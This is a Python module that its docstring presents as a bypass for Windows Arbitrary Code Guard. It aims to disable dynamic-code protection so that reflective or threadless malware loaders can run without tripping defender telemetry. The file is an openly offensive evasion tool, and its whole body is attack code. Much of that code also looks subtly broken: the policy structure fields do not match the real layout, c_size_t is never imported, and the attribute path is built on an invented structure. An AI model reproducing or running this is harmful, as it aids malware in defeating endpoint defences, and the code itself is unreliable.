"""
ACG (Arbitrary Code Guard) Bypass Module
=========================================
Disables Windows 10+ ACG policy for the current process to allow
threadless / reflective loader execution without triggering
"Dynamic Code Protection" telemetry.

Credits/References:
- @Windows Defender / AMSI bypass community research
- PROCESS_MITIGATION_DYNAMIC_CODE_POLICY structure
- SetProcessMitigationPolicy / UpdateProcThreadAttribute paths
"""

import ctypes
import ctypes.wintypes
import platform
import sys
from ctypes import Structure, Union, c_uint32, c_uint8, c_void_p, windll, byref, sizeof, c_ulong, c_int, c_uint
from typing import Optional
from dataclasses import dataclass
from enum import Enum


class MitigationFlags(Enum):
    NONE = 0
    ENABLE = 0x1
    AUDIT = 0x2


@dataclass
class ACGBypassResult:
    success: bool
    method: str = "unknown"
    error: Optional[str] = None
    audit_mode: bool = False


class ACGBypass:
    """
    Arbitrary Code Guard bypass for Windows 10 1709+ / Windows 11.

    Methods:
    1. SetProcessMitigationPolicy - direct policy disable
    2. UpdateProcThreadAttribute - PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
    """

    def __init__(self):
        self.system = platform.system()
        if self.system != "Windows":
            self.available = False
            self.reason = "Windows-only"
        else:
            self.available = True
            self.reason = None

    def bypass(self, method: str = "auto") -> ACGBypassResult:
        """
        Disable ACG for current process.

        Args:
            method: "auto", "policy", or "attribute"
        """
        if not self.available:
            return ACGBypassResult(False, error=f"ACG bypass not available: {self.reason}")

        if method == "policy":
            return self._bypass_policy()
        elif method == "attribute":
            return self._bypass_attribute()
        else:
            result = self._bypass_policy()
            if not result.success:
                result = self._bypass_attribute()
            return result

    def _bypass_policy(self) -> ACGBypassResult:
        """
        Try SetProcessMitigationPolicy / SetProcessInformation path.
        """
        try:
            kernel32 = windll.kernel32
            ntdll = windll.ntdll

            PROCESS_MITIGATION_DYNAMIC_CODE_POLICY = 0x4
            ProcessDynamicCodePolicy = 0x4

            class PROCESS_MITIGATION_DYNAMIC_CODE_POLICY(ctypes.Structure):
                _fields_ = [
                    ("AllowRemoteDowngrade", c_uint32, 1),
                    ("AuditProhibitDynamicCode", c_uint32, 1),
                    ("ReservedFlags", c_uint32, 30),
                ]

            policy = PROCESS_MITIGATION_DYNAMIC_CODE_POLICY()
            policy.AllowRemoteDowngrade = 1
            policy.AuditProhibitDynamicCode = 0
            policy.ReservedFlags = 0

            result = kernel32.SetProcessMitigationPolicy(
                ProcessDynamicCodePolicy,
                byref(policy),
                sizeof(policy)
            )

            if result:
                return ACGBypassResult(True, method="SetProcessMitigationPolicy")

            error = ctypes.GetLastError()

            if error == 87:
                policy2 = PROCESS_MITIGATION_DYNAMIC_CODE_POLICY()
                policy2.AllowRemoteDowngrade = 1
                policy2.AuditProhibitDynamicCode = 0
                policy2.ReservedFlags = 0

                result2 = kernel32.SetProcessInformation(
                    c_ulong(-1),
                    ProcessDynamicCodePolicy,
                    byref(policy2),
                    sizeof(policy2)
                )
                if result2:
                    return ACGBypassResult(True, method="SetProcessInformation")

            return ACGBypassResult(False, error=f"Policy bypass failed: winerr={error}")

        except Exception as exc:
            return ACGBypassResult(False, error=f"Policy bypass exception: {exc}")

    def _bypass_attribute(self) -> ACGBypassResult:
        """
        UpdateProcThreadAttribute with PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY.
        This requires creating a new process with the attribute, so we use
        the current process handle if possible via NtSetInformationProcess.
        """
        try:
            ntdll = windll.ntdll
            kernel32 = windll.kernel32

            PROCESS_MITIGATION_POLICY = 0x4
            ProcessDynamicCodePolicy = 0x4

            class PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY(ctypes.Structure):
                _fields_ = [
                    ("Policy", c_uint32),
                    ("Flags", c_uint32),
                ]

            class PROC_THREAD_ATTRIBUTE(ctypes.Structure):
                _fields_ = [
                    ("Attribute", c_void_p),
                    ("Size", c_size_t),
                    ("u", c_void_p),
                ]

            flags = c_uint32(0x3)
            policy_val = c_uint32(0x2)

            attr = PROC_THREAD_ATTRIBUTE(
                Attribute=ctypes.cast(ctypes.byref(PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY(
                    Policy=ProcessDynamicCodePolicy,
                    Flags=0x3
                )), c_void_p),
                Size=sizeof(PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
                u=ctypes.cast(ctypes.byref(policy_val), c_void_p),
            )

            handle = kernel32.GetCurrentProcess()
            if not handle:
                return ACGBypassResult(False, error="GetCurrentProcess failed")

            result = ntdll.NtSetInformationProcess(
                handle,
                PROCESS_MITIGATION_POLICY,
                byref(attr),
                sizeof(attr)
            )

            if result == 0:
                return ACGBypassResult(True, method="NtSetInformationProcess")

            return ACGBypassResult(False, error=f"Attribute bypass failed: ntstatus=0x{result:x}")

        except Exception as exc:
            return ACGBypassResult(False, error=f"Attribute bypass exception: {exc}")


def is_acg_enabled() -> bool:
    """
    Quick check if ACG is currently enabled for the process.
    """
    if platform.system() != "Windows":
        return False

    try:
        kernel32 = windll.kernel32

        class PROCESS_MITIGATION_DYNAMIC_CODE_POLICY(ctypes.Structure):
            _fields_ = [
                ("AllowRemoteDowngrade", c_uint32, 1),
                ("AuditProhibitDynamicCode", c_uint32, 1),
                ("ReservedFlags", c_uint32, 30),
            ]

        policy = PROCESS_MITIGATION_DYNAMIC_CODE_POLICY()
        result = kernel32.GetProcessMitigationPolicy(
            c_ulong(-1),
            0x4,
            byref(policy),
            sizeof(policy)
        )

        if not result:
            return False

        return (policy.AllowRemoteDowngrade == 0) and (policy.AuditProhibitDynamicCode == 1)

    except Exception:
        return False
